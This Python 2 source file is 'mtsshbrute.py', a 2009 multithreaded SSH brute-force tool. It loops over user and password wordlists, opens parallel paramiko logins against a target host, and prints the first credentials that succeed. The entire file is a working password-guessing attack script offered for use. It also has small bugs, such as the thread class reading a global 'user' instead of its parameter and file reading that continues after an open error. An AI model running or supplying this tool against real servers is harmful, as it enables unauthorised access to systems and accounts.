#!/usr/bin/env python
import sys, time
from threading import Thread

try:
    from paramiko import SSHClient
    from paramiko import AutoAddPolicy
except ImportError:
    print '''
    You need paramiko module.
    http://www.lag.net/paramiko/    
    Debian/Ubuntu: aptitude install python-paramiko\n'''
    sys.exit(1)


def license():
    '''Print the usage license to this software, yeah, it's the same as above'''
    print '''
    mtsshbrute.py - Simple multithreaded ssh brute force.
    Copyright (C) 2009  Ulisses "thebug" Castro (http://ulissescastro.wordpress.com)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
    '''


class BruteForce(Thread):
    def __init__(self, username, password, target, port, timeout):
        super(BruteForce, self).__init__()

        self.__port   = port
        self.target   = target
        self.password = password
        self.user     = user
        self.timeout  = timeout
        self.status   = 'unknown'


    def run(self):
        '''
        Create SSH connection to target
        '''
        ssh = SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        try:
            ssh.connect(self.target, port = self.__port, username = self.user, password = self.password, pkey=None, timeout = self.timeout, allow_agent=False, look_for_keys=False)
            self.status = 'ok'
            ssh.close()
        except Exception, e:
            self.status = 'error'
            pass


def makelist(file):
    '''
    Make lists
    '''
    items = []

    try:
        fd = open(file, 'r')
    except IOError:
        print 'unable to read file \'%s\'' % file
        pass

    except Exception, e:
        print 'unknown error'
        pass

    for line in fd.readlines():
        item = line.replace('\n', '').replace('\r', '')
        items.append(item)

    return items


if __name__ == '__main__':
    from optparse import OptionError
    from optparse import OptionParser
    
    
    version = '''----------------------------------------------------------------------
 Multithreaded SSH Brute Force 
 Version 0.2                                  uss.thebug[at]gmail.com
----------------------------------------------------------------------'''

    usage = '%s [-H target] [-p port] [-U userslist] [-P wordlist] [-T threads] [-w timeout] [-v]' % sys.argv[0]

    parser = OptionParser(version=version, usage=usage)

    parser.add_option('-H', dest='target', help='hostname/ip')
    parser.add_option('-p', type='int', dest='port', default=22, help='port (default:%default)')
    parser.add_option('-U', dest='userlist', help='userlist file')
    parser.add_option('-P', dest='passlist', help='passwordlist file')
    parser.add_option('-T', type='int', dest='threads', default=16, help='number of connections in parallel (%default threads)')
    parser.add_option('-w', type='int', dest='timeout', default=30, help='defines the max wait time in seconds for responses (%default secs)')
    parser.add_option('-v', '--verbose', action='store_true', dest='verbose', help='verbose')
    parser.add_option('-l', '--license', action='store_true', dest='license', help='license')

    (options, args) = parser.parse_args()

    if options.license:
        license()
        sys.exit(0)

    if not options.target or not options.userlist or not options.passlist:
        parser.print_help()
        sys.exit(1)

    target = options.target
    port = options.port
    users = options.userlist
    passwords = options.passlist
    threads = options.threads
    timeout = options.timeout
    
    results = []
    tcounter = 0

    userlist = makelist(users)
    passwordlist = makelist(passwords)

    print "[*] SSH Brute Force Ninja"
    print "[*] %s user(s) loaded." % str(len(userlist))
    print "[*] %s password(s) loaded." % str(len(passwordlist))
    print "[*] Brute Force started."

    for user in userlist:
        for password in passwordlist:
            current = BruteForce(user, password, target, port, timeout)
            results.append(current)
            current.start()
            tcounter += 1
            if options.verbose:
                print "   [+] user: %s" % user + "  password: %s\n" % password,
            if tcounter == threads:
                for result in results:
                    result.join()
                    if result.status == 'error':
                        pass
                    else:
                        print "\n[*] got it!"
                        print "[*] user: %s" % result.user
                        print "[*] password: %s\n" % result.password
                        sys.exit(0)
                tcounter = 0
    
    print "[*] Done.\n"
    sys.exit(0)


